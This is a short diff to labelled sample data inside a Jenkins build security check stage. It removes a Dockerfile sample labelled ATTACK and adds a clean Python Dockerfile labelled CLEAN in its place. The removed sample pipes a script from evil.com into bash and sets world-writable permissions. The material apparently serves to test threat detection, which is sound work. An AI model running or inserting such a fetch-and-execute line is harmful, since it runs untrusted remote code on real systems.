@@ -94,8 +94,8 @@ stage('Build Security Check') {
 {
   "sample_id": "jenkins_build_001",
   "file_name": "Dockerfile",
-  "file_content": "FROM python:latest\\nRUN curl http://evil.com/install.sh | bash\\nRUN chmod 777 /app",
-  "actual_label": "ATTACK"
+  "file_content": "FROM python:3.12-slim\\nWORKDIR /app\\nCOPY requirements.txt .\\nRUN pip install -r requirements.txt\\nCOPY . .\\nCMD [\\"python\\", \\"app.py\\"]",
+  "actual_label": "CLEAN"
 }
 EOF
 
